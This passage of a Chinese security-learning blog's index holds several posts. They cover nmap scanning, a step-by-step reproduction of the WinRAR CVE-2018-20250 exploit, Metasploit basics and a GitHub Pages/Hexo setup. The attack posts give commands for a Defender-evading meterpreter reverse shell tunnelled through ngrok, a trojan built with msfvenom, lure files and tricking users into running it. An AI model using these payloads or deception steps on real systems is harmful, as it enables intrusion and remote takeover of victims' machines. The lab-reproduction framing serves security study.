class="headerlink" title="3.使用花生壳"></a>3.使用花生壳</h3><p>可去官网开通    <a href="https://hsk.oray.com/" target="_blank" rel="noopener">https://hsk.oray.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellinabox </tag>
            
            <tag> ngrok </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap基础命令</title>
      <link href="/2019/03/16/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/03/16/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p><strong>nmap (network mapper)</strong> 最早是Linux中扫描和嗅探工具，网络连接端扫描工具，主要是探测目标机器上开启的服务、安全性问题、主机存活等等</p><h2 id="二、基本功能"><a href="#二、基本功能" class="headerlink" title="二、基本功能"></a>二、基本功能</h2><ol><li>探测机器存活情况；（是否开机）</li><li>扫端口；（服务）</li><li>扫描目标机器系统类型；（OS类型：NT/Linux）</li></ol><h2 id="三、高级用法；"><a href="#三、高级用法；" class="headerlink" title="三、高级用法；"></a>三、高级用法；</h2><ol><li>扫描目标机器上的安全漏洞；</li></ol><a id="more"></a><h2 id="四、nmap安装"><a href="#四、nmap安装" class="headerlink" title="四、nmap安装"></a>四、nmap安装</h2><h2 id="五、配置环境变量"><a href="#五、配置环境变量" class="headerlink" title="五、配置环境变量"></a>五、配置环境变量</h2><h2 id="六、基本用法"><a href="#六、基本用法" class="headerlink" title="六、基本用法"></a>六、基本用法</h2><p><strong>命令行模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -h #帮助信息</span><br><span class="line">nmap [扫描类型] [选项] [目标]</span><br><span class="line">nmap 192.168.1.100#对单个目标进行扫描</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.11.1</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>端口状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">open</span><br><span class="line">closed</span><br><span class="line">filtered #被过滤的，探测包被拦截，无法定位该端口是否开启</span><br><span class="line">unfiltered #未过滤的，探测包没有被拦截，但是nmap还是无法判断该端口是否开启</span><br><span class="line">open|filtered #开放或者被过滤</span><br><span class="line">close|filtered#关闭或者被过滤</span><br></pre></td></tr></table></figure><p>批量扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.11.0/24#扫描整个网段</span><br><span class="line">nmap 192.179.1.1-200#扫描1-200之间的主机</span><br><span class="line">nmap 192.167.1.1,2,7-40</span><br><span class="line">nmap 192.168.168.1.0/24 192.10.1.3.1-200#多网段扫描</span><br></pre></td></tr></table></figure><p>文件扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 192.168.10.11 &gt; titlename</span><br><span class="line">nmap iL titlename（扫描文件）</span><br></pre></td></tr></table></figure><p>随机选择目标 nmap -iR ，例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -PS80 -iR 0（无休止去扫描） -p80</span><br></pre></td></tr></table></figure><p>排除扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.0/24 --exculde 192.168.1.1,255,4-10</span><br><span class="line">   --exculde 排除主机/网络</span><br><span class="line">nmap -iL scan_file(要扫的目标) --exculdefile noscan_file(不需要扫)</span><br></pre></td></tr></table></figure><h2 id="七、带有参数的扫描"><a href="#七、带有参数的扫描" class="headerlink" title="七、带有参数的扫描"></a>七、带有参数的扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-s（Scan）</span><br><span class="line">-T（TCP）</span><br><span class="line"></span><br><span class="line">nmap -sT 使用-sT实现TCP全连接扫描，扫描过程中有三次握手</span><br><span class="line">建立连接 则表明端口开放 扫描速度慢</span><br><span class="line"></span><br><span class="line">nmap -sS 192.168.1.1 使用syn的数据包去探测,如果收到ACK，则说明端口开放</span><br><span class="line">nmap -sN -p- 192.168.1.1 NULL扫描，不设置任何控制位</span><br><span class="line">-p 端口 1-1000-p-所有端口</span><br><span class="line">-p20,21,22,23,24,25</span><br><span class="line"></span><br><span class="line">nmap -sV 192.168.1.1-V 探测服务的版本</span><br><span class="line"></span><br><span class="line">将结果写入到文件中</span><br><span class="line">nmap 192.168.1.1 &gt;./result.txt</span><br><span class="line">nmap  -sV 192.168.10.5 -oX  result.html</span><br><span class="line"></span><br><span class="line">nmap -A 192.168.1.1 所有扫描结果的详细信息 全面扫描</span><br><span class="line">nmap -O 192.168.1.1 显示操作系统信息</span><br></pre></td></tr></table></figure><h2 id="八、高级用法"><a href="#八、高级用法" class="headerlink" title="八、高级用法"></a>八、高级用法</h2><p><strong>扫描安全漏洞</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--script使用脚本探测漏洞</span><br><span class="line">nmap --script脚本名称 目标</span><br><span class="line">在nmap的安装路径中有 /script/</span><br><span class="line">在该目录中存放nmap的脚本</span><br><span class="line"></span><br><span class="line">nmap --script smb-vuln-ms17-010 192.168.11.232</span><br><span class="line">永恒之蓝</span><br><span class="line"></span><br><span class="line">nmap --script smb-check-vulns 192.168.11.232</span><br><span class="line">MS08-067（SMB）溢出漏洞</span><br><span class="line"></span><br><span class="line">nmap --script ssl-heartbleed 192.168.11.232</span><br><span class="line">探测心脏滴血漏洞</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-20250-WinRAR远程代码执行漏洞</title>
      <link href="/2019/03/16/CVE-2018-20250-WinRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/03/16/CVE-2018-20250-WinRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>WinRAR 代码执行相关的CVE 编号如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253</span><br></pre></td></tr></table></figure><p>这里我们复现最开始的WinRAR目录穿越漏洞（CVE-2018-20250）。</p><h2 id="二、漏洞详情"><a href="#二、漏洞详情" class="headerlink" title="二、漏洞详情"></a>二、漏洞详情</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h3><p>WinRAR目录穿越漏洞（CVE-2018-20250）：</p><p>​    该漏洞是由于WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在2006 年被编译，没有任何的基础保护机制(ASLR,DEP 等)。该动态链接库的作用是处理ACE 格式文件。而在解压处理过程中存在一处目录穿越漏洞,允许解压过程写入文件至开机启动项，导致代码执行。</p><a id="more"></a><p><em>漏洞细节</em>: <a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p><h3 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WinRAR &lt; 5.70 Beta 1</span><br><span class="line">Bandizip &lt; = 6.2.0.0</span><br><span class="line">好压(2345压缩) &lt; = 5.9.8.10907</span><br><span class="line">360压缩 &lt; = 4.0.0.1170</span><br></pre></td></tr></table></figure><h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><h3 id="1-准备"><a href="#1-准备" class="headerlink" title="1. 准备"></a>1. 准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KaliLinux（2019.1)</span><br><span class="line">Metasploit(KaliLinux2019.1已经集成了Metasploit5)</span><br><span class="line">ngrok</span><br></pre></td></tr></table></figure><h3 id="2-下载EXP"><a href="#2-下载EXP" class="headerlink" title="2. 下载EXP"></a>2. 下载EXP</h3><p><strong>下载WinRAR远程代码执行漏洞EXP利用文件:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/WyAtu/CVE-2018-20250.git</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/1552705180118.png" alt="1552705180118"></p><h3 id="3-开启ngrok"><a href="#3-开启ngrok" class="headerlink" title="3. 开启ngrok"></a>3. 开启ngrok</h3><p>浏览器打开<a href="https://www.ngrok.com/" target="_blank" rel="noopener">https://www.ngrok.com/</a> 进行账号登录，开通一个免费的隧道转发代理。</p><p>按照首页的步骤建立如下连接</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/343244.png" alt></p><h3 id="4-生成Payload"><a href="#4-生成Payload" class="headerlink" title="4. 生成Payload"></a>4. 生成Payload</h3><p>Metasploit生成免杀Payload 载荷(针对Windows10的defender)</p><p>使用Metasploit5自带的免杀模块生成Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use evasion/windows/windows_defender_exe(选择msf5免杀模块)</span><br><span class="line">show info(显示模块信息)</span><br><span class="line">set filename WinRarPayloadTest.exe(设置Payload名字 )</span><br><span class="line">set payload windows/meterpreter/reverse_tcp(设置Payload类型 )</span><br><span class="line">set lhost tcp://0.tcp.ngrok.io(设置上线地址，填写Ngrok映射出去的地址即可)</span><br><span class="line">set lport 17814(设置监听端口，填写Ngrok映射出去的端口即可 )</span><br><span class="line">run(生成Payload)</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sfasfe.png" alt></p><p>把Payload文件放到EXP文件夹下的根目录</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/asd57h.png" alt></p><p>打开exp.py文件把“calc.exe“修改成”WinRarPayload.exe”保存</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sdasdf676.png" alt></p><p>Python运行exp.py文件自动在文件根目录下生成恶意压缩包。</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/Y4HG8TCD3.png" alt></p><p>已经成功生成了恶意的压缩包，这时候可以往里面放一些引诱文件就变成了诱人的压缩包了。</p><p>Windows7靶机下载解压这个恶意压缩包：</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/saass.png" alt></p><p>解压后自动在系统启动目录下自动出现我们之前生成的Payload</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/dfgjhjh456754.png" alt></p><p>Windows7系统启动目录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>Metasploit启动远程监听主机上线请求:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.20</span><br><span class="line">set lport 8878</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/%$V6[`8.png" alt></p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/2B3X4XPAT0W.png" alt></p><p>确保ngrok后台在运行,然后重启Windows7靶机，metasploit监听等待上线</p><h3 id="5-验证payload"><a href="#5-验证payload" class="headerlink" title="5. 验证payload"></a>5. 验证payload</h3><p>待更新</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinRAR </tag>
            
            <tag> Metasploit </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit(MSF)入门</title>
      <link href="/2019/03/14/Metasploit-MSF/"/>
      <url>/2019/03/14/Metasploit-MSF/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Metasploit介绍"><a href="#一、Metasploit介绍" class="headerlink" title="一、Metasploit介绍"></a>一、Metasploit介绍</h2><p>综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。</p><h2 id="二、Metasploit启动"><a href="#二、Metasploit启动" class="headerlink" title="二、Metasploit启动"></a>二、Metasploit启动</h2><p>kali集成了Metasploit框架，依赖于postgresql数据库</p><ol><li><p>先启动数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>启动MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li></ol><h2 id="三、生成木马程序"><a href="#三、生成木马程序" class="headerlink" title="三、生成木马程序"></a>三、生成木马程序</h2><p>利用MSF生成木马获取meterpreter反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br></pre></td></tr></table></figure><a id="more"></a><p>-p  选用什么payload<br>lhost  监听ip<br>lport  监听端口<br>-f  生成文件的类型</p><h2 id="四、投放木马到目标机上"><a href="#四、投放木马到目标机上" class="headerlink" title="四、投放木马到目标机上"></a>四、投放木马到目标机上</h2><h2 id="五、开启监听"><a href="#五、开启监听" class="headerlink" title="五、开启监听"></a>五、开启监听</h2><p>启用MSF，具体操作如下：</p><ol><li><p>加载expuse </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/handler</span><br></pre></td></tr></table></figure></li><li><p>加载payload（要和生成木马选用的payload一致）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></li><li><p>查看哪些参数是需要输入的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show opptions</span><br><span class="line">#设置监听的IP</span><br><span class="line">set lhost 192.168.10.14</span><br><span class="line">#设置监听的端口</span><br><span class="line">set lport 8787</span><br></pre></td></tr></table></figure></li><li><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run/exploit</span><br></pre></td></tr></table></figure></li></ol><h2 id="六、进行欺骗"><a href="#六、进行欺骗" class="headerlink" title="六、进行欺骗"></a>六、进行欺骗</h2><ol><li>诱导用户点击我们的木马程序</li><li>等待用户上线，就能得到meterpreter</li></ol><h2 id="七、获得shell"><a href="#七、获得shell" class="headerlink" title="七、获得shell"></a>七、获得shell</h2><ol><li><p>执行shell 进到被攻击者电脑的终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></li><li><p>添加添加用户  开机3389 连接桌面(</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.10.19</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用GitHub Pages搭建个人博客</title>
      <link href="/2019/03/13/%E5%88%A9%E7%94%A8github%20pages+hexo%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/03/13/%E5%88%A9%E7%94%A8github%20pages+hexo%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、创建GitHub-Pages"><a href="#一、创建GitHub-Pages" class="headerlink" title="一、创建GitHub Pages"></a>一、创建GitHub Pages</h2><p>使用GitHub Pages搭建博客的好处有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 全是静态文件，访问速度快；</span><br><span class="line">2. 免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</span><br><span class="line">3. 可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</span><br><span class="line">4. 数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</span><br><span class="line">5. 博客内容可以轻松打包、转移、发布到其它平台；</span><br><span class="line">6. 等等；</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="1-首先创建存储库"><a href="#1-首先创建存储库" class="headerlink" title="1. 首先创建存储库"></a>1. 首先创建存储库</h3><p>前往<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>并<a href="https://github.com/new" target="_blank" rel="noopener">创建一个</a>名为<em>username</em> .github.io <a href="https://github.com/new" target="_blank" rel="noopener">的新存储库</a>，其中<em>username</em>是GitHub上的用户名（或组织名称）</p><p><img src="/2019/03/13/利用github pages+hexo 搭建个人博客/1552609247373.png" alt="1552609247373"></p><p><strong>注意：如果存储库名字的第一部分与你的用户名不完全匹配，则无法正常工作，因此请务必正确使用。</strong></p><h3 id="2-安装-Git"><a href="#2-安装-Git" class="headerlink" title="2. 安装 Git"></a>2. 安装 Git</h3><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>.</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> ：<code>brew install git</code>;或下载 <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">安装程序</a> 安装。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code> </li></ul><h3 id="3-配置SSH连接GitHub"><a href="#3-配置SSH连接GitHub" class="headerlink" title="3. 配置SSH连接GitHub"></a>3. 配置SSH连接GitHub</h3><ol><li><p>配置SSH Key</p><ul><li><p>检查本机是否有ssh key设置</p><p>右键打开git bash</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><ul><li>如果没有则提示： No such file or directory，则需要生成ssh密钥</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;github注册邮箱&quot;</span><br></pre></td></tr></table></figure><ul><li><p>然后连续3次回车，最终会生成一个.ssh文件 复制.ssh/id_rsa.pub里内容<br>路径为：C:\Users\Administrator/.ssh (Administrator为你当前登录电脑使用的用户名)</p></li><li><p>打开github - 右上角头像 -Setting - SSH and GPG keys - New SSH key<br>title随便填写，Key内容为.ssh/id_rsa.pub的内容</p><p><img src="/2019/03/13/利用github pages+hexo 搭建个人博客/14398360-5516f5c5666265cd.png" alt="利用github pages+hexo 搭建个人博客"></p></li></ul></li><li><p>配置账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name “your_username”  #设置用户名</span><br><span class="line">git config --global user.email “your_registered_github_Email”  </span><br><span class="line">#设置邮箱地址(建议用注册giuhub的邮箱)</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>测试是否配置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com       # 邮箱地址不需要改。</span><br></pre></td></tr></table></figure><p>直接回车，最后看到这个就说明大功告成：</p><p><em>Hi username! You’ve successfully authenticated, but GitHub does not provide shell access.</em></p></li></ol><h3 id="4-克隆到本地存储库"><a href="#4-克隆到本地存储库" class="headerlink" title="4. 克隆到本地存储库"></a>4. 克隆到本地存储库</h3><p>转到要存储项目的文件夹，然后克隆新存储库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/用户名/用户名.github.io</span><br></pre></td></tr></table></figure><h3 id="5-创建内容"><a href="#5-创建内容" class="headerlink" title="5. 创建内容"></a>5. 创建内容</h3><p>转入项目文件夹并添加index.html文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd username.github.io</span><br><span class="line">echo“Hello World”&gt;index.html</span><br></pre></td></tr></table></figure><h3 id="6-推送到GitHub"><a href="#6-推送到GitHub" class="headerlink" title="6. 推送到GitHub"></a>6. 推送到GitHub</h3><p>添加，提交和推送你的更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add --all</span><br><span class="line">git commit -m“初始提交”</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h3 id="7-浏览你的Github-Pages"><a href="#7-浏览你的Github-Pages" class="headerlink" title="7.浏览你的Github Pages"></a>7.浏览你的Github Pages</h3><p>Well done，启动浏览器并转到<a href="https://username.github.io。" target="_blank" rel="noopener">https://username.github.io。</a></p><h2 id="二、使用Hexo博客框架"><a href="#二、使用Hexo博客框架" class="headerlink" title="二、使用Hexo博客框架"></a>二、使用Hexo博客框架</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h3 id="1-安装前提"><a href="#1-安装前提" class="headerlink" title="1. 安装前提"></a>1. 安装前提</h3><ol><li>安装 Hexo 相当简单。然而在安装前，需确保已安装下列应用程序：</li></ol><ul><li><p><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a></p></li><li><p><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></p></li></ul><ol start="2"><li><p>安装 Git，并开启ssh连接</p><p>上文已介绍安装和连接步骤</p></li></ol><ol start="3"><li>安装 Node.js</li></ol><p>安装 Node.js 的最佳方式是使用 <a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm</a>。</p><p>cURL:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>Wget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>安装完成后，重启终端并执行下列命令即可安装 Node.js。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nvm install stable</span><br></pre></td></tr></table></figure><p>或者您也可以下载 <a href="http://nodejs.org/" target="_blank" rel="noopener">安装程序</a> 来安装。</p><blockquote><p>Windows 用户</p><p>对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选<strong>Add to PATH</strong>选项。<br>另外，您也可以使用<strong>Git Bash</strong>，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用<strong>Git Bash</strong>来进行操作。</p></blockquote><h3 id="2-快速部署Hexo"><a href="#2-快速部署Hexo" class="headerlink" title="2. 快速部署Hexo"></a>2. 快速部署Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><p><strong>_config.yml</strong></p><p>网站的配置信息，您可以在此配置大部分的参数。</p><p><strong>package.json</strong></p><p>应用程序信息，新添加的插件内容也会出现在这里面。</p><p><strong>scaffolds</strong></p><p>模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p>这里放了三个模板文件，分别是新添加博客文章（posts）、新添加博客页（page）和新添加草稿（draft）的目标样式。</p><p><strong>source</strong></p><p>资源文件夹是存放博客内容的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。之后我们通过命令新建tags（标签）还有categories（分类）页后，这里会相应地增加文件夹。</p><p><strong>themes</strong></p><p>主题文件夹。Hexo 会根据主题来生成静态页面。</p><h3 id="3-Hexo命令"><a href="#3-Hexo命令" class="headerlink" title="3. Hexo命令"></a>3. Hexo命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g(generate)#生成静态页面</span><br><span class="line">hexo s(server)#启动服务器，默认4000端口，在本地查看内容</span><br></pre></td></tr></table></figure><h3 id="4-部署到github"><a href="#4-部署到github" class="headerlink" title="4. 部署到github"></a>4. 部署到github</h3><p>修改git/blog/_config.yml配置，找到Deployment部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 